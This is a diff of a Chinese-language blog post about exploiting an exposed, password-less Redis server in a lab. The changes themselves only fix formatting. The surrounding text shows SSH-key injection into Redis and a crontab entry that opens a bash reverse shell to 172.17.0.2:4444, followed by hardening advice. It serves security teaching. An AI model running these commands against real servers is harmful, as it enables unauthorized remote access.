@@ -48,7 +48,8 @@ OK
 OK
 ```
 将测试服务器的公钥当成 value 写到 redis, 如果没有请先用 ssh-keygen 生成
-```[root@attack-client src]# (echo -e "\n\n";cat /root/.ssh/id_rsa.pub;echo -e "\n\n") > 1.txt
+```
+[root@attack-client src]# (echo -e "\n\n";cat /root/.ssh/id_rsa.pub;echo -e "\n\n") > 1.txt
 [root@attack-client src]# cat 1.txt | ./redis-cli -h 172.17.0.3 -x set xxx
 OK
 [root@attack-client src]# ./redis-cli -h 172.17.0.3 -p 6379
@@ -99,7 +100,8 @@ OK
 OK
 ```
 上面其实就是构造了 /var/spool/cron/root, 然后生成攻击 key 并保存，其中 value 是一个合法的 crontab
-```172.17.0.3:6379> set xxx "\n\n*/1 * * * * /bin/bash -i>& /dev/tcp/172.17.0.2/4444 0>&1\n\n"
+```
+172.17.0.3:6379> set xxx "\n\n*/1 * * * * /bin/bash -i>& /dev/tcp/172.17.0.2/4444 0>&1\n\n"
 OK
 172.17.0.3:6379> get xxx
 "\n\n*/1 * * * * /bin/bash -i>& /dev/tcp/172.17.0.2/4444 0>&1\n\n"
@@ -143,6 +145,7 @@ Feb  5 13:47:01 ubuntu2 cron[754]: (root) INSECURE MODE (mode 0600 expected) (cr
 2. 设置 auth 密码，尽量是复杂一些的
 3. redis 只临听内网
 4. 设置防火墙，但是一般公司内网是全通的
+
 ### 小结
 本篇到此结束，如有问题请大家斧正，欢迎订阅公众号 **董泽润的技术笔记**，以后会有更多关于技术，排查 bug 的分享
 
